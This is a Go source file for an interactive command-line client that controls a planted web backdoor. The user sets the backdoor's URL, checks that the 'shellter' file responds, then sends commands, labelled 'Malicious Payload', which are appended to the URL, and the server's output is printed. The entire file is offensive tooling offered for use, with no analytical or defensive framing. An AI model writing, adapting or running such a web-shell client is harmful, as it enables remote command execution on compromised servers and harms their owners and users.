package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"

	prompt "github.com/c-bata/go-prompt"
)

var (
	Url      string
	Cmd      string
	InParams string
)
var LivePrefixState struct {
	LivePrefix string
	IsEnable   bool
}

func executor(in string) {
	in = strings.TrimSpace(in)
	blocks := strings.Split(in, " ")
	switch blocks[0] {
	case "url":
		if len(blocks) < 2 {
			fmt.Println("please set query, Example : url localhost/test.php")
			return
		}

		Url = blocks[1]
		fmt.Println("[+] Set url backdoor : ", Url)

	case "command":
		if len(blocks) < 2 {
			fmt.Println("please set query, Example : command ls")
			return
		}

		command := blocks[1]
		if InParams == "yes" {
			url := Url + command
			doRequest(url)
			return
		}

	case "params":
		if len(blocks) < 2 {
			InParams = "no"
			return
		}

		InParams = blocks[1]
		fmt.Println("[+] Set Params : ", InParams)
		return

	case "connect":
		doCheckFileBackdoor(Url)
		return

	}

	if in == "" {
		LivePrefixState.IsEnable = false
		LivePrefixState.LivePrefix = in
		return
	}

	LivePrefixState.LivePrefix = blocks[0] + " -->> "
	LivePrefixState.IsEnable = true
}

func completer(in prompt.Document) []prompt.Suggest {
	s := []prompt.Suggest{
		{Text: "url", Description: "Url for your backdoor "},
		{Text: "command", Description: "Malicious Payload "},
		{Text: "params", Description: "Payload position "},
		{Text: "connect", Description: "check backdoor file "},
	}
	return prompt.FilterHasPrefix(s, in.GetWordBeforeCursor(), true)
}

func changeLivePrefix() (string, bool) {
	return LivePrefixState.LivePrefix, LivePrefixState.IsEnable
}

func doCheckFileBackdoor(url string) {
	fmt.Println("[+] Checking shellter file ..")
	resp, err := http.Get(url)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	// Print the HTTP response status.
	if resp.StatusCode == 200 {
		fmt.Println("[+] Interactive shellter found !!")
		return
	}
	fmt.Println("[!] Failed. Exploit Maybe no use")
	return
}

func doRequest(url string) {
	resp, err := http.Get(url)
	if err != nil {
		print(err)
	}

	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		print(err)
	}

	fmt.Print(string(body))
	fmt.Println("\n")
}

func main() {
	p := prompt.New(
		executor,
		completer,
		prompt.OptionPrefix("-->> "),
		//zprompt.OptionLivePrefix(changeLivePrefix),
		prompt.OptionTitle("live-prefix-example"),
	)
	p.Run()
}
